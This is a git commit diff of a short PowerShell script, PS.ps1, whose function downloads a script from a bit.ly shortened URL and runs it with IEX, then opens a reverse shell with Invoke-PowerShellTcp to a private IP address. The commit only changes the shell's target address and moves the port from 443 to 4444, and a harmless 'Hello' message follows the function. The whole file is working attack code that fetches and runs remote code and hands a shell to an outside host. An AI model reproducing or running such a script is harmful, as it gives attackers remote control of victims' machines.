5b1863491839142c53d44ee84dd624ccd9931429
lallouSs <47110370+lallouSs@users.noreply.github.com>
2019-02-15 10:58:36 +0200

    Update PS.ps1

--- PS.ps1
+++ PS.ps1
@@ -1,7 +1,7 @@
 function RunThis(){
     $wc = New-Object System.Net.Webclient
     IEX $wc.DownloadString("https://bit.ly/1RJwIiD")
-    Invoke-PowerShellTcp -Reverse -IPAddress 10.13.251.215 -Port 443
+    Invoke-PowerShellTcp -Reverse -IPAddress 10.13.250.113 -Port 4444
 }
 
 Write-Host "Hello"
